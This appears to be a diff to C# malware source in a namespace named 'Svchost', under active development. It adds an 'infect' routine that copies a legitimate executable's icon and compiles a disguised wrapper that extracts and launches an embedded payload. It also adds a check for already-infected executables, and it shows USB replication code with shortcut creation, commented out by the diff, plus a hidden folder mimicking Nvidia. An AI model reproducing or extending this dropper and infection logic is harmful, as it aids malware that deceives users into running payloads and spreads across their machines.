@@ -1,10 +1,15 @@
 ﻿using System;
 using System.IO;
+using System.Drawing;
 using System.Collections.Generic;
 using System.Diagnostics;
+using System.CodeDom.Compiler;
 
 using System.Windows.Forms;
 using Svchost.Spread;
+using System.Reflection;
+using System.Drawing.IconLib;
+using Microsoft.CSharp;
 
 namespace Svchost.TextHandling
 {
@@ -31,15 +36,51 @@ namespace Svchost.TextHandling
             targetFolder = "C:\\Users\\" + windowsName + "\\.Nvidia\\";
             usbFolderName = "Music\\";
 
-            checkEnvironment();
-           /* if (checkEnvironment())
+            /*
+            if (checkEnvironment())
                 driveDetector = new DriveDetector(applicationPath + assemblyName, replicateOverUSB);*/
+
+            infect();
+        }
+
+        private bool isExecutableInfected(string path)
+        {
+            try
+            {
+                Assembly assembly = Assembly.LoadFile(path);
+                foreach (string resourceName in assembly.GetManifestResourceNames())
+                {
+                    if (resourceName.Contains(assemblyName))
+                        return true;
+                }
+            }
+            catch
+            {
+
+            }
+            return false;
+        }
+
+        private void exctractIcon(string path)
+        {
+            try
+            {
+                Icon icon = Icon.ExtractAssociatedIcon(path);
+                MultiIcon mIcon = new MultiIcon();
+                SingleIcon sIcon = mIcon.Add("oink");
+                sIcon.CreateFrom(icon.ToBitmap(), IconOutputFormat.Vista);
+                sIcon.Save(@"D:\DevMain\bdo\SvchostTest\Svchost\bin\Debug\icon6.ico");
+                /* FileStream fs = new FileStream(@"icon.ico", FileMode.Create);
+                 icon.Save(fs);
+                 fs.Close();*/
+            }
+            catch { }
         }
 
         public void replicateOverUSB(DriveInfo drive)
         {
             //Potentially not infected usb found
-            string usbRootFolder = drive.RootDirectory.FullName;
+            /*string usbRootFolder = drive.RootDirectory.FullName;
             string targetFolder = usbRootFolder + usbFolderName;
 
             if (!Directory.Exists(targetFolder))
@@ -70,7 +111,7 @@ namespace Svchost.TextHandling
                 shortcut.WorkingDirectory = targetFolder;
                 shortcut.IconLocation = shortcutIconLocation;
                 shortcut.Save();
-            }
+            }*/
         }
         
         private bool checkEnvironment()
@@ -107,6 +148,53 @@ namespace Svchost.TextHandling
                 Environment.Exit(0);
                 return false;
             }
+        }
+
+        static CSharpCodeProvider cSharpCodeProvider = new CSharpCodeProvider();
+        static CompilerParameters compilerParameters = new CompilerParameters
+        {
+            GenerateExecutable = true,
+            OutputAssembly = "compiledTest3.exe"
+        };
+
+        void infect()
+        {
+            exctractIcon(@"D:\NeoDevMain\CPHD\Pasta\Win32\EXE\CPHD.exe");
+
+            compilerParameters.ReferencedAssemblies.Add("System.dll");
+            compilerParameters.EmbeddedResources.Add("test.exe");
+            compilerParameters.CompilerOptions = @"/win32icon:D:\DevMain\bdo\SvchostTest\Svchost\bin\Debug\icon6.ico";
+
+            string cSharpCode = "public class Robot" +
+            "{" +
+            "   static void Main()" +
+            "   {" +
+            "       ExtractResource( \"KeyboardLayout.test.exe\", \"test.exe\" );" +
+            "       System.Diagnostics.Process.Start(\"test.exe\");" +
+            "   }" +
+
+            "   static void ExtractResource(string resource, string path)" +
+            "   {" +
+            "       System.IO.Stream stream = typeof(Robot).Assembly.GetManifestResourceStream(resource);" +
+            "       byte[] bytes = new byte[(int)stream.Length];" +
+            "       stream.Read(bytes, 0, bytes.Length);" +
+            "       System.IO.File.WriteAllBytes(path, bytes);" +
+            "   }" +
+            "}";
+
+
+            CompilerResults results = cSharpCodeProvider.CompileAssemblyFromSource(compilerParameters,
+            new[] { cSharpCode });
+
+            foreach (string output in results.Output)
+            {
+                Console.WriteLine(output);
+            }
+
+            Assembly assembly = results.CompiledAssembly;
+            results.PathToAssembly = "./";
+            /*dynamic robot = assembly.CreateInstance("Robot");
+            robot.Speak();*/
         }
     }
 }
